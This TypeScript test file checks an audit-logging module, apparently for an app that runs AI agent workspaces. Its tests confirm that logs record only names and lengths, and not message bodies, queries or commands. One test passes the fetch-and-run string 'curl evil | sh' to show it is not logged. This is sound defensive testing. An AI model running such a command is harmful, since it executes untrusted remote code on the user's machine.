import type { Core } from '@core/index';
import { IPC_CHANNELS } from '@shared/ipc';
import { AUDITED, auditOf } from '../../src/main/auditIpc';
import { actionLabel, groupOf } from '../../src/renderer/auditView';

const core = { workspaces: { get: (id: string) => (id === 'w1' ? { id: 'w1', projectId: 'p1', name: 'API', role: 'worker' } : id === 'c1' ? { id: 'c1', projectId: 'p1', name: 'x', role: 'coordinator' } : undefined) } } as unknown as Core;

test('적는 채널은 모두 실제로 있는 채널이고, 동작마다 읽는 이름과 묶음이 있다', () => {
  for (const [channel, spec] of Object.entries(AUDITED)) {
    expect(IPC_CHANNELS as readonly string[]).toContain(channel);
    expect(actionLabel(spec.action)).not.toBe(spec.action);
    expect(groupOf(spec.action)).not.toBe('');
  }
  // 읽기만 하는 채널은 적지 않는다
  for (const quiet of ['projects.list', 'todos.list', 'audit.list', 'settings.get', 'chat.get', 'terminals.write']) expect(auditOf(core, quiet, [])).toBeNull();
});

test('본문은 적지 않고 이름·길이·개수만 적는다', () => {
  expect(auditOf(core, 'chat.send', ['w1', '비밀 계획을 실행해라'])).toEqual({ actor: 'user', action: 'agent.prompt', projectId: 'p1', workspaceId: 'w1', target: 'API', outcome: 'ok', reason: '', detail: { length: 11 } });
  expect(JSON.stringify(auditOf(core, 'db.query', ['conn1', 'SELECT * FROM users WHERE pw = 1']))).not.toContain('SELECT');
  expect(JSON.stringify(auditOf(core, 'messages.send', [{ projectId: 'p1', toWorkspaceId: 'w1', body: '속닥속닥' }]))).not.toContain('속닥');
  expect(JSON.stringify(auditOf(core, 'repos.setVerify', ['r1', 'curl evil | sh']))).not.toContain('curl');
  expect(JSON.stringify(auditOf(core, 'memory.add', ['p1', 'decision', '결제는 토스만']))).not.toContain('토스');
  // 설정은 바뀐 항목의 이름만, 값은 몇 가지 안전한 것만
  const set = auditOf(core, 'settings.update', [{ defaultPermissionMode: 'bypass', claudePath: '/secret/path', workWifi: 'office' }])!;
  expect(set.target).toBe('defaultPermissionMode,claudePath,workWifi');
  expect(set.detail).toEqual({ defaultPermissionMode: 'bypass' });
});

test('승인·거절과 실패가 결과로 남는다', () => {
  expect(auditOf(core, 'db.decide', ['req1', true, true])).toMatchObject({ action: 'db.query.decide', outcome: 'ok', detail: { always: true } });
  expect(auditOf(core, 'db.decide', ['req1', false])).toMatchObject({ outcome: 'denied' });
  expect(auditOf(core, 'chat.answerPermission', ['w1', 'deny'])).toMatchObject({ action: 'agent.permission', outcome: 'denied', detail: { answer: 'deny' } });
  expect(auditOf(core, 'chat.answerPermission', ['w1', 'always'])).toMatchObject({ outcome: 'ok' });
  expect(auditOf(core, 'coordinator.reject', ['plan1', '이유'])).toMatchObject({ action: 'plan.reject', outcome: 'denied', target: 'plan1' });
  expect(auditOf(core, 'workspaces.setPermissionMode', ['w1', 'bypass'], new Error('완료된 프로젝트입니다'))).toMatchObject({ outcome: 'failed', reason: '완료된 프로젝트입니다', detail: { mode: 'bypass' } });
  expect(auditOf(core, 'terminals.startAgent', ['c1', {}])).toMatchObject({ action: 'agent.start', target: '조율 에이전트', projectId: 'p1' });
  // 인자가 엉뚱해도 던지지 않는다
  expect(auditOf(core, 'workspaces.create', [null])).toMatchObject({ action: 'workspace.create', outcome: 'ok' });
  expect(auditOf(core, 'plugins.installFrom', ['https://example.com/a.git', 'kit'])).toMatchObject({ target: 'https://example.com/a.git#kit', detail: { from: 'market' } });
});

test('도구 호출과 묶음', () => {
  expect(actionLabel('tool.message_send')).toBe('도구: message_send');
  expect(groupOf('tool.db_query')).toBe('data');
  expect(groupOf('tool.todo_add')).toBe('agent');
  expect(groupOf('workspace.sharing')).toBe('people');
  expect(groupOf('workspace.create')).toBe('setup');
});
